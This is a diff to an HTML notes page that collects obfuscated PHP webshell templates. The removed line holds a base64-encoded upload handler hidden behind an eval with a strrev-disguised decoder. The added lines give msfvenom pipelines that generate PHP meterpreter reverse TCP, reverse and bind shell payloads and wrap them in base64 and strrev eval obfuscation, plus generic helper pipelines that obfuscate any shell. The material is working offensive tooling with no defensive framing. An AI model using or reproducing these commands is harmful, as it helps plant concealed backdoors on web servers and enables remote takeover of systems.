@@ -5,4 +5,15 @@
 <title>Basic Obfuscated</title>
 </head><body>&lt;?php &nbsp; &nbsp;<br/>
 $b = strrev("edoced_4" . "6esab"); &nbsp; &nbsp;<br/>
-eval( $b('JHVwbG9hZGRpciA9ICcuLyc7DQokdXBsb2FkZmlsZSA9ICR1cGxvYWRkaXIgLiBiYXNlbmFtZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyduYW1lJ10pOw0KDQplY2hvICI8cD4iOw0KDQppZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VzZXJmaWxlJ11bJ3RtcF9uYW1lJ10sICR1cGxvYWRmaWxlKSkgew0KICBlY2hvICJGaWxlIGlzIHZhbGlkLCBhbmQgd2FzIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZC5cbiI7DQp9IGVsc2Ugew0KICAgZWNobyAiVXBsb2FkIGZhaWxlZCI7DQp9DQoNCmVjaG8gIjwvcD4iOw0KZWNobyAnPHByZT4nOw0KZWNobyAnSGVyZSBpcyBzb21lIG1vcmUgZGVidWdnaW5nIGluZm86JzsNCnByaW50X3IoJF9GSUxFUyk7DQpwcmludCAiPC9wcmU+Ijs=') ); &nbsp; &nbsp;?&gt;</body></html>
+eval( $b('BASE_64_SHELL_HERE') ); &nbsp; &nbsp;?&gt;<br/>
+<br/>
+Generation commands that work...<br/>
+msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw | base64 | tr -d "\r\n" | tr -d "=" | sed -e 's/^/&lt;?php eval(base64_decode(\"/' | awk 'NF{print $0 "\")); ?&gt;"}' &gt; meter_shell.txt<br/>
+msfvenom -p php/reverse_php LHOST= LPORT= -f raw | base64 | tr -d "\r\n" | tr -d "=" | sed -e 's/^/&lt;?php eval(base64_decode(\"/' | awk 'NF{print $0 "\")); ?&gt;"}' &gt; shell2.txt<br/>
+msfvenom -p php/reverse_php LHOST= LPORT= -f raw | base64 | tr -d "\r\n" | tr -d "=" | sed -e 's/^/&lt;?php $b=strrev("edoced_4" . "6esab"); eval( $b("/' | awk 'NF{print $0 "\")); ?&gt;"}' &gt; shell3.txt<br/>
+msfvenom -p php/bind_php LPORT= -f raw | base64 | tr -d "\r\n" | tr -d "=" | sed -e 's/^/&lt;?php $b=strrev("edoced_4" . "6esab"); eval( $b("/' | awk 'NF{print $0 "\")); ?&gt;"}' &gt; shell4.txt<br/>
+<br/>
+<br/>
+Command to help<br/>
+base64 | tr -d "\r\n" | tr -d "=" | sed -e 's/^/&lt;?php eval(base64_decode(\"/' | awk 'NF{print $0 "\")); ?&gt;"}' &gt; shell.txt<br/>
+base64 | tr -d "\r\n" | tr -d "=" | sed -e 's/^/&lt;?php $b=strrev("edoced_4" . "6esab"); eval( $b("/' | awk 'NF{print $0 "\")); ?&gt;"}' &nbsp;&gt; shell.txt</body></html>
